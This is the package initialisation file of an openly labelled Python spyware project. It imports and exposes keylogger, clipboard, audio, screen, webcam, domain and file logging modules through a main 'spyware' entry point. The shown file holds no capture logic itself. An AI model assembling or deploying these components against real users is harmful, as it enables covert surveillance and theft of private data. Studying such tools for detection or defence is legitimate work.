#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
This package implements a spyware.
"""

###################
#    This package implements a spyware.
#    Copyright (C) 2021, 2022  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

__version__ = "1.0.0"
__all__ = [
    "AudioLogger",
    "CopyLogger",
    "DomainsLogger",
    "FilesLogger",
    "KeyLogger",
    "ScreenLogger",
    "WebcamLogger",
    "spyware",
]

try:
    import AudioLogger
    import CopyLogger
    import DomainsLogger
    import FilesLogger
    import KeyLogger
    import ScreenLogger
    import WebcamLogger
    from SpyWare import main as spyware
except ImportError:
    from . import AudioLogger
    from . import CopyLogger
    from . import DomainsLogger
    from . import FilesLogger
    from . import KeyLogger
    from . import ScreenLogger
    from . import WebcamLogger
    from .SpyWare import main as spyware

print(
    """
SpyWare  Copyright (C) 2021, 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
)
